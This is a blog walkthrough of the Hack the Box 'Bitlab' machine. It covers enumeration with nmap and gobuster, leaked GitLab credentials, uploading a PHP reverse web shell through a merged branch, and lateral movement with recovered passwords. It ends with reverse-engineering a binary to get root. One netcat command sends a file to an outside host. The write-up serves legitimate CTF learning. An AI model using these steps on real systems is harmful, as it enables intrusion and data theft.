+++
author = "Nick"
categories = ["hack the box", "decrypt", "PHP", "gitlab", "GIT", "reverse shell", "psql", "ssh", "ollydbg", "reverse engineering"]
date = 2020-01-11T12:20:41Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2019/10/bitlab_info.png"
slug = "hack-the-box-bitlab"
summary = "Welcome back! Today we are doing the machine Bitlab on Hack the Box. "
tags = ["hack the box", "decrypt", "PHP", "gitlab", "GIT", "reverse shell", "psql", "ssh", "ollydbg", "reverse engineering"]
title = "Hack the Box - Bitlab"

+++


Welcome back! Today we are doing the machine Bitlab on Hack the Box.

As usual we start with our nmap scan: ```nmap -sC -sV -oA bitlab_scan 10.10.10.114```.

Our initial scan comes back with two results. Ports ```22``` and ```80```. We see that port ```80``` is leaking some info in the scan from the ```robots.txt```:

```
Nmap scan report for 10.10.10.114
Host is up (0.087s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.114/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.72 seconds
```

Now I'll run ```gobuster``` against the URL:

```gobuster dir -u http://10.10.10.114 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o go_results.txt --wildcard```. 

While that runs through I'll start to manually parse through the site and see if there are any glaring hints. This will usually include, checking default passwords, source code and looking up the platform that is running.

{{< figure src="__GHOST_URL__/content/images/2019/10/image-80.png" >}}

The ```gobuster``` results show 5 potential locations. We browse through each and notice nothing particularly useful. However, if you continue to manually enumerate the page you will see there is a ```bookmarks.html``` link under the help section. When we follow this through we see there is an obfuscated JS function.

{{< figure src="__GHOST_URL__/content/images/2019/10/image-81.png" >}}

When we de-obfuscate the function we get the following:

{{< figure src="__GHOST_URL__/content/images/2019/10/image-82.png" >}}

It looks like an attempt to make an auto login type function. By passing the ```username``` clave and ```password``` of 11des0081x to the gitlab page. So we manually try these credentials and they work!

{{< figure src="__GHOST_URL__/content/images/2019/10/image-83.png" >}}

Now that we have an authenticated. We can continue to look around the page to see what might be of use. At this point in the enumeration we have also run a ```searchsploit``` on gitlab to see what might be out there. We do see there are a few options, one of which might be promising. We will continue to sift through the commits. The ```index.php``` file has some execution happening on it which we might be able to leverage. We also see some interesting code under the snippets location. A username and password for the postrgres connector. We also have the admins profile page. We have the ability to create files and merge them. So this will be easy, we'll just upload a webshell, merge the branch and go to the page we've just created.

{{< figure src="__GHOST_URL__/content/images/2019/10/image-84.png" >}}

We use the standard ```pentest monkey``` reverse web shell upload it, start our ```netcat``` listener, merge the branch and navigate to the page. Next thing you know we have a webshell.

{{< figure src="__GHOST_URL__/content/images/2019/10/image-85.png" >}}

We try to snag the ```user.txt``` but run into a permissions issue. So we'll start enumerating with some standard tools, ```linenum``` and ```pspy64```. We fire up our ```SimpleHTTPServer``` and download what we need. While that runs we take a look at what we can run as a privileged user. We have the ability to ```git pull```. We also see that we are in a docker container, so we'll want to try an enumerate the other portion of the systems. As it turns out nmap is on the system and we have the ability to run it.

We run an nmap scan against the IP's that we've found to enumerate them a bit further. We come back with quite a listing:

```
Starting Nmap 7.60 ( https://nmap.org ) at 2019-10-21 15:36 UTC
Nmap scan report for bitlab (172.19.0.1)
Host is up (0.00038s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt

Nmap scan report for 172.19.0.2
Host is up (0.00051s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
6379/tcp open  redis

Nmap scan report for 172.19.0.3
Host is up (0.00038s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
5432/tcp open  postgresql

Nmap scan report for 172.19.0.4
Host is up (0.00011s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 172.19.0.5
Host is up (0.00014s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8181/tcp open  intermapper

Starting Nmap 7.60 ( https://nmap.org ) at 2019-10-21 15:39 UTC
Nmap scan report for bitlab (172.17.0.1)
Host is up (0.000090s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
8000/tcp open  http-alt
```

Now we've got a fairly good idea of the landscape. Lets focus on gaining user. If we circle back around to the enumeration we did previously, we can try to leverage the hidden snippet we found. When we look at it, we see that it's making a database connection but that's it. So once the connection is made, we can just output the rows. We then create this file and merge the branch.

{{< figure src="__GHOST_URL__/content/images/2019/10/image-87.png" >}}

Once we've merged the branch, we head over to the page name and see what results come back.

{{< figure src="__GHOST_URL__/content/images/2019/10/image-86.png" >}}

Looks like we get a username and a ```base64``` encrypted password. We decode it and get ```ssh-str0ng-p@ss```. So either this entire string is the password or some combination of it is the ```ssh``` password. So when I try to ```ssh``` into the box as the user, I keep getting denied. So is this possibly not the right password? As the ```www-data user```, we try to change users to clave. We have the ability to but we don't seem to have the right password. Maybe the password is the hash, we are doing CTF's ;). Sure enough, the password was the hash and not the decrypted content.

{{< figure src="__GHOST_URL__/content/images/2019/10/image-88.png" >}}

Now that we're are loggin in as clave, we snag our user.txt and move onto root. In Clave's home directory we have a binary called ```RemoteConnection.exe```. Now often Remote Connection tools can save credentials inside. So we'll transfer the binary back to our system start to reverse engineer it. So we set up a ```netcat``` listener on our machine. We then send the file on the remote machine: ```nc -w 3 10.10.15.236 1999 < RemoteConnection.exe```. Once we've received the file we can start to break it down.

We'll use [Ollydbg](http://www.ollydbg.de/) as our debugger to see what it may show. I also did a quick glace at the file in Ida as well. 

We'll load the application into Olly. Initially stepping into the application looking for the entry point that we can enter data to our application. We set a few breakpoints on those and start stepping in. We are able to quickly find what we are looking for:

{{< figure src="__GHOST_URL__/content/images/2019/10/image-89.png" >}}

{{< figure src="__GHOST_URL__/content/images/2019/10/image-90.png" >}}

{{< figure src="__GHOST_URL__/content/images/2019/10/image-91.png" >}}

We have a root password here! Let's see if it works.

{{< figure src="__GHOST_URL__/content/images/2019/10/image-92.png" >}}

It does indeed. Root flag captured! Overall a pretty easy box. I know that some people I spoke to said that you could go right from the low privileged shell to root using ```git pull```. There are multiple paths to root on this box. This is just how I did mine!

Hopefully something was learned. If you found this write-up helpful, consider sending some respect my way: [Lovecore's HTB Profile](https://www.hackthebox.eu/home/users/profile/95635).



